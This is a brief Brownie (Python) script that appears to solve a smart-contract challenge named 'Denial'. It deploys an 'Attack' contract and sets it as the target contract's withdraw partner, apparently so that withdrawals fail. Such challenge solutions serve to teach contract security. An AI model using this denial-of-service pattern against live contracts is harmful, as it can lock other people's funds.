from eth_utils import from_wei
from brownie import Contract, Attack, Denial
from scripts.helpful_scripts import *

account = getAccount()

denial = Contract.from_abi(
    "Denial", "0xeEc8D3F11A2Fb18477eCfaf716CF4247aA07571e", Denial.abi
)


def main():
    attacker = Attack.deploy({"from": account})
    denial.setWithdrawPartner(attacker.address, {"from": account})
